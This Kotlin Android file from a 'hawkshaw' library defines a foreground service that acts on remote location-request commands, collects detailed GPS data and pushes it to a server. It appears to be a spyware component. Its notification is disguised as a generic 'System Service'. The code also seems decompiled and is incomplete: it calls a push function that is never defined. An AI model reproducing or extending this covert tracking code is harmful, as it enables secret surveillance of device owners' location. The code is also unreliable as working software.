package com.hawkshaw.library.features.location

import android.app.Notification
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log // Added for Android logging
import androidx.annotation.RequiresApi
import androidx.core.app.NotificationCompat
import com.hawkshaw.library.datalayer.models.Command
import com.hawkshaw.library.datalayer.models.Location
import com.hawkshaw.library.datalayer.network.twirp.interceptors.ContentNegotiationInterceptorKt
import com.hawkshaw.library.ktextensions.safeLaunch
import com.hawkshaw.library.logger.Logger
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import java.util.concurrent.CancellationException

/**
 * Foreground service for location updates
 * 
 * This service handles location updates in the background, showing a foreground notification
 * and stopping itself after the expiration duration
 */
@RequiresApi(Build.VERSION_CODES.O)
class ForegroundLocationService : Service() {
    companion object {
        const val KEY_LOCATION_REQUEST = "location_request"
        private const val NOTIFICATION_ID = 101
        private const val TAG = "ForegroundLocationService"
        private const val CHANNEL_ID = "location_service_channel"
    }
    
    // Expiration duration for location updates, defaults to 5 minutes
    private var expirationDuration: Long = 300000
    
    // Job for cancelling updates after expiration
    private var cancelUpdateJob: Job? = null
    
    // Lazy initialization of FusedLocation
    private val fusedLocation: FusedLocation by lazy {
        Log.d(TAG, "[DEBUG] Initializing FusedLocation.")
        FusedLocation(this, this::pushLocation)
    }
    
    override fun onBind(intent: Intent?): IBinder? {
        Log.d(TAG, "[DEBUG] onBind called with intent: $intent")
        return null
    }
    
    override fun onDestroy() {
        Log.d(TAG, "[DEBUG] onDestroy called.")
        // Existing Logger.d is good for general service destruction.
        Logger.d(TAG, "Location service destroying", false, 4, null)
        
        // Cancel the update job if it exists
        if (cancelUpdateJob != null) {
            Log.d(TAG, "[DEBUG] Cancelling cancelUpdateJob.")
            cancelUpdateJob?.cancel(CancellationException("Service destroyed"))
            cancelUpdateJob = null
        } else {
            Log.d(TAG, "[DEBUG] cancelUpdateJob was null, no cancellation needed.")
        }
        
        // Stop location updates
        Log.d(TAG, "[DEBUG] Calling fusedLocation.stopLocationUpdates().")
        fusedLocation.stopLocationUpdates()
        
        // Stop as foreground service
        Log.d(TAG, "[DEBUG] Calling stopForeground(STOP_FOREGROUND_REMOVE).")
        stopForeground(STOP_FOREGROUND_REMOVE)
        
        super.onDestroy()
        Log.d(TAG, "[DEBUG] onDestroy finished.")
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "[DEBUG] onStartCommand called. Intent: $intent, Flags: $flags, StartId: $startId")
        // Existing Logger.d is good for general service start.
        Logger.d(TAG, "Location service started", false, 4, null)
        
        // Process the location request from intent
        intent?.getStringExtra(KEY_LOCATION_REQUEST)?.let { locationRequestJson ->
            Log.d(TAG, "[DEBUG] Received locationRequestJson: $locationRequestJson")
            val json = ContentNegotiationInterceptorKt.json
            try {
                val getLocationRequest = json.decodeFromString(
                    Command.GetLocationRequest.serializer(),
                    locationRequestJson
                )
                Log.d(TAG, "[DEBUG] Decoded getLocationRequest: $getLocationRequest")

                getLocationRequest.let { request ->
                    // Start as a foreground service with notification
                    Log.d(TAG, "[DEBUG] Calling startForeground with NOTIFICATION_ID: $NOTIFICATION_ID.")
                    startForeground(NOTIFICATION_ID, getNotification())

                    // Schedule job to cancel updates after expiration
                    Log.d(TAG, "[DEBUG] Calling startCancelUpdatesJob.")
                    startCancelUpdatesJob() // Initial call using default or previous expirationDuration

                    // Request location updates
                    Log.d(TAG, "[DEBUG] Calling fusedLocation.checkAndRequestLocationUpdates with request: $request")
                    fusedLocation.checkAndRequestLocationUpdates(request)

                    // Update expiration duration from the current request
                    expirationDuration = request.expirationDuration
                    Log.d(TAG, "[DEBUG] Updated expirationDuration to: $expirationDuration ms from request.")
                    // If expiration duration changed, restart the cancel job with the new duration
                    // This is important if startCancelUpdatesJob was called before expirationDuration was updated from this specific request
                    Log.d(TAG, "[DEBUG] Restarting cancelUpdatesJob with potentially new expirationDuration.")
                    startCancelUpdatesJob()
                }
            } catch (e: Exception) {
                Log.e(TAG, "[DEBUG] Error decoding locationRequestJson: ${e.message}", e)
                Logger.e(TAG, "Error decoding location request: ${e.message}", e, false, 12, null)
            }
        } ?: Log.w(TAG, "[DEBUG] locationRequestJson is null in intent extras for key $KEY_LOCATION_REQUEST.")
        
        return START_REDELIVER_INTENT
    }
    
    /**
     * Creates a notification for the foreground service
     */
    private fun getNotification(): Notification {
        Log.d(TAG, "[DEBUG] getNotification called.")
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Location service")
            .setContentText("System Service")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setWhen(System.currentTimeMillis())
            .build()
    }
    
    /**
     * Push location to the server
     */
    @RequiresApi(Build.VERSION_CODES.O)
    private fun pushLocation(androidLocation: android.location.Location) {
        Log.d(TAG, "[DEBUG] pushLocation called with Android Location: $androidLocation")
        CoroutineScope(Dispatchers.IO).safeLaunch {
            // Create a class to handle pushing location data
            val locationData = Location(
                latitude = androidLocation.latitude,
                longitude = androidLocation.longitude,
                altitude = androidLocation.altitude,
                accuracy = androidLocation.accuracy,
                verticalAccuracyMeters = androidLocation.verticalAccuracyMeters,
                speed = androidLocation.speed,
                bearing = androidLocation.bearing,
                provider = androidLocation.provider ?: "unknown",
                time = androidLocation.time,
                isMock = if (android.os.Build.VERSION.SDK_INT >= 31) androidLocation.isMock else androidLocation.isFromMockProvider
            )
            Log.d(TAG, "[DEBUG] Created Location data object for push: $locationData")

            // Push the location data to the server
            // Assuming pushLocationData is a suspend function or handles its own threading
            Log.d(TAG, "[DEBUG] Calling pushLocationData (actual push logic not shown here).")
            pushLocationData(locationData) // Definition of pushLocationData is not in this file
            Log.d(TAG, "[DEBUG] pushLocationData call completed.")
        }
    }
    
    // Placeholder for the pushLocationData function if it were in this file
    // private suspend fun pushLocationData(locationData: Location) {
    //    Log.d(TAG, "[DEBUG] pushLocationData: Would push $locationData here.")
    // }

    /**
     * Starts a job to cancel location updates after the expiration duration
     */
    private fun startCancelUpdatesJob() {
        Log.d(TAG, "[DEBUG] startCancelUpdatesJob called. Current expirationDuration: $expirationDuration ms.")
        // Cancel previous job if it exists
        if (cancelUpdateJob != null) {
            Log.d(TAG, "[DEBUG] Previous cancelUpdateJob exists. Cancelling it.")
            cancelUpdateJob?.cancel(CancellationException("New job started"))
        } else {
            Log.d(TAG, "[DEBUG] No previous cancelUpdateJob to cancel.")
        }
        
        // Start new job
        Log.d(TAG, "[DEBUG] Starting new cancelUpdateJob with delay: $expirationDuration ms.")
        cancelUpdateJob = CoroutineScope(Dispatchers.IO).safeLaunch {
            Log.d(TAG, "[DEBUG] cancelUpdateJob: Coroutine started. Delaying for $expirationDuration ms.")
            delay(expirationDuration)
            Log.d(TAG, "[DEBUG] cancelUpdateJob: Delay finished. Calling stopForeground(STOP_FOREGROUND_REMOVE).")
            stopForeground(STOP_FOREGROUND_REMOVE) // Changed to STOP_FOREGROUND_REMOVE to match onDestroy
            Log.d(TAG, "[DEBUG] cancelUpdateJob: Service should be stopped now.")
            // Consider calling stopSelf() if the service needs to be fully stopped and not just removed from foreground.
            // stopSelf()
        }
    }
}
